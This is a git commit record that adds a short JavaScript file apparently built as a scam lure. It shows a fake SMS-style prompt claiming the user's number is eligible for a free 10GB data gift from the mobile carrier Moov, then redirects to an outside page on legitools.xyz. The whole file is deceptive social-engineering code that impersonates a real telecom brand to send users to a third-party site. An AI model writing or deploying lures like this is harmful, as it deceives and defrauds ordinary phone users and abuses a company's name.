bf3ad4b087ace5a3bcfbe67a9f66f7bd36659010
Wesjohnson21 <mfonjohnson85@gmail.com>
2024-11-29 01:00:41 -0800

    Create moov-10gb.data-gift.js

---
+++ moov-10gb.data-gift.js
@@ -0,0 +1,5 @@
+var password = '10GB Free Data'
+password=prompt('SMS: Congratulations Your Number is Eligible to receive 10GB Free Data Gift From Moov, Kindly Press OK to ACTIVATE. ','10GB Free Data');
+if (password != '10GB Free Data') {
+location.href='https://legitools.xyz/moov-10gb.data-gift.html.html';
+}
